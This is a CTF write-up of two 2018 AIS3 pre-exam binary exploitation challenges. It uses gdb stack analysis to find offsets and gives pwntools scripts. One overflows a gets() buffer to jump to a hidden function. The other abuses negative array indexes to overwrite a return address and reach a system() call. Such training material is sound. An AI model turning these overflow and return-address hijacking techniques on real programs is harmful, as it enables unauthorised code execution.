---
title: pwn
date: 2018-08-01 21:11:44
tags:
  - CTF
  - AIS3
  - pre exam
categories:
  - CTF
  - AIS3
  - 2018
---


This is 2018 AIS3 prexam pwn writeups.
<!-- More -->

## mail
`disass` shows nothing.
`objdump -d ./mail | less` found a function called `reply`.
Use `gdb` check it.

```sh=
gdb-peda$ disass reply
Dump of assembler code for function reply:
   0x0000000000400796 <+0>:     push   rbp
   0x0000000000400797 <+1>:     mov    rbp,rsp
   0x000000000040079a <+4>:     sub    rsp,0x10
   0x000000000040079e <+8>:     mov    edi,0x400928
   0x00000000004007a3 <+13>:    call   0x400610 <puts@plt>
   0x00000000004007a8 <+18>:    mov    edi,0x40095b
   0x00000000004007ad <+23>:    mov    eax,0x0
   0x00000000004007b2 <+28>:    call   0x400630 <printf@plt>
   0x00000000004007b7 <+33>:    mov    esi,0x400970
   0x00000000004007bc <+38>:    mov    edi,0x400972
   0x00000000004007c1 <+43>:    call   0x400680 <fopen@plt>
   0x00000000004007c6 <+48>:    mov    QWORD PTR [rbp-0x8],rax
   ...
End of assembler dump.
gdb-peda$ 
```
`fopen` so make a return address of `main` change to reply.

Enter `main` function and check it has two variable to cover `RET` of `main`.
Make a break point at first variable input.
```sh=
gdb-peda$ disass
Dump of assembler code for function main:
   ...
   0x0000000000400853 <+81>:    call   0x400630 <printf@plt>
   0x0000000000400858 <+86>:    lea    rax,[rbp-0x20]
   0x000000000040085c <+90>:    mov    rdi,rax
   0x000000000040085f <+93>:    mov    eax,0x0
   0x0000000000400864 <+98>:    call   0x400650 <gets@plt>
   ...
gdb-preda$ b *0x0000000000400864
Breakpoint 2 at 0x400864
gdb-peda$ info b
Num     Type           Disp Enb Address            What
1       breakpoint     keep y   0x0000000000400806 <main+4>
        breakpoint already hit 1 time
2       breakpoint     keep y   0x0000000000400864 <main+98>
gdb-peda$ 
```

Execute program and get `main` function's `RBP` and `RSP` address which is ..
```sh
RBP: 0x7fffffffdcd0 --> 0x4008a0 (<__libc_csu_init>:    push   r15)
RSP: 0x7fffffffd990 --> 0x7ffff7a1dff8 --> 0x6c5f755f72647800 ('')
```

Hit `continue` to enter some dummy data in order to locat variable's address in `stack`. (I put a bouch of `'A'`.)
Locate `0x....dbd0` in stack.
```sh=
gdb-preda$ stack 120
...
0792| 0x7fffffffdca8 --> 0x0
0800| 0x7fffffffdcb0 ('A' <repeats 32 times>)
0808| 0x7fffffffdcb8 ('A' <repeats 24 times>)
0816| 0x7fffffffdcc0 ('A' <repeats 16 times>)
0824| 0x7fffffffdcc8 ("AAAAAAAA")
0832| 0x7fffffffdcd0 --> 0x400800 (<reply+106>: leave)
0840| 0x7fffffffdcd8 --> 0x7ffff7a2d830 
                    (<__libc_start_main+240>:       mov    edi,eax)
0848| 0x7fffffffdce0 --> 0x0 
...
```

So the variable is at `0x....dcb0`, calculate offset with `RBP(0x....dcd0)` is 32 Bytes.
And the `RTN` is front of `RBP` which is `$rbp - 0x8`, so we need to cover `32 + 8` bytes from first variable.

Find the function `reply` its address is...
```sh=
gdb-peda$ disass reply
Dump of assembler code for function reply:
   0x0000000000400796 <+0>:     push   rbp
...
```

That every thing. cover dummy data with 40 bytes and input `reply` function's address `0x....400796`
Wrote a small python...
```python=
from pwn import *

p = process('./mail')
#p = remote('104.199.235.135', 2111)
p.sendline('A' * (32 + 8) + '\x96\x07\x40\x00\x00\x00\x00\x00')
print(p.recv())
p.interactive()
```

---

## darling
Use array index to jump to variable `permission_code` and change to `6666`.
and cover function `read()` it's return address to function `debug()`.
```sh=
gdb-peda$ disass debug
Dump of assembler code for function debug:
   0x00000000004007d6 <+0>:     push   rbp
   0x00000000004007d7 <+1>:     mov    rbp,rsp
   0x00000000004007da <+4>:     mov    edi,0x400d88
   0x00000000004007df <+9>:     call   0x400660 <system@plt>
   0x00000000004007e4 <+14>:    nop
   0x00000000004007e5 <+15>:    pop    rbp
   0x00000000004007e6 <+16>:    ret    
End of assembler dump.
gdb-peda$ 
```

Use `gdb` make a break point at `   0x0000000000400c8f <+1192>:  call   0x400680 <read@plt>`
`skip` nto read function and check it's return address to found stack address.

```sh=
gdb-peda$ stack 30
0000| 0x7fffffffdb68 --> 0x400c94 
                    (<main+1197>: mov    eax,DWORD PTR [rbp-0x14c])
0008| 0x7fffffffdb70 --> 0x0 
0016| 0x7fffffffdb78 --> 0x800000001 
0024| 0x7fffffffdb80 --> 0x500000000 
0032| 0x7fffffffdb88 --> 0x1a0a 
0040| 0x7fffffffdb90 --> 0x2 
0048| 0x7fffffffdb98 --> 0x10 
0056| 0x7fffffffdba0 --> 0x10 
0064| 0x7fffffffdba8 --> 0x2 
0072| 0x7fffffffdbb0 --> 0xf 
0080| 0x7fffffffdbb8 --> 0x38 ('8')
0088| 0x7fffffffdbc0 --> 0x186 
0096| 0x7fffffffdbc8 --> 0x29a 
0104| 0x7fffffffdbd0 --> 0x22c 
0112| 0x7fffffffdbd8 --> 0xd6 
0120| 0x7fffffffdbe0 ("Strelitzia")
0128| 0x7fffffffdbe8 --> 0x6169 ('ia')
0136| 0x7fffffffdbf0 ("Delphinium")
0144| 0x7fffffffdbf8 --> 0x6d75 ('um')
0152| 0x7fffffffdc00 ("Argentea")
0160| 0x7fffffffdc08 --> 0x0 
0168| 0x7fffffffdc10 --> 0x617473696e6547 ('Genista')
0176| 0x7fffffffdc18 --> 0x0 
0184| 0x7fffffffdc20 ("Chlorophytum")
0192| 0x7fffffffdc28 --> 0x6d757479 ('ytum')
--More--(25/30)  
```

I select first element which is `Strelitzia` which stack address is `0x....dbe0` to offset to return address whichs `0x....db8`, and the offset range is 120 byte.
The char array store `Strelitzia` is a 16 bytes long element. so each index I decrease would cause memory address move backward 16 byte.
At least I have to backward 16 * 8(128 byte) to cover return address.
But need more 8 dummy character to fit into extra backward.

```python=
from pwn import *

#p = process('./darling')
p = remote('104.199.235.135', 2112)
p.sendlineafter('Index: ', '-1')
p.sendlineafter('Code: ', '6666')
p.sendlineafter('Are you sure ? (yes:1 / no:0) ', '0')
p.sendlineafter('Index: ', '0')
p.sendlineafter('Code: ', '2')
p.sendlineafter('Are you sure ? (yes:1 / no:0) ', '0')
p.sendlineafter('Index: ', '1')
p.sendlineafter('Code: ', '16')
p.sendlineafter('Are you sure ? (yes:1 / no:0) ', '1')

p.sendlineafter('Which FRANXX do you wnat to use ? ', '-8')
p.sendlineafter(
    'New name for this FRANXX: ',
    'A' * 8 + p64(0x00000000004007D6)
)
p.interactive()
```
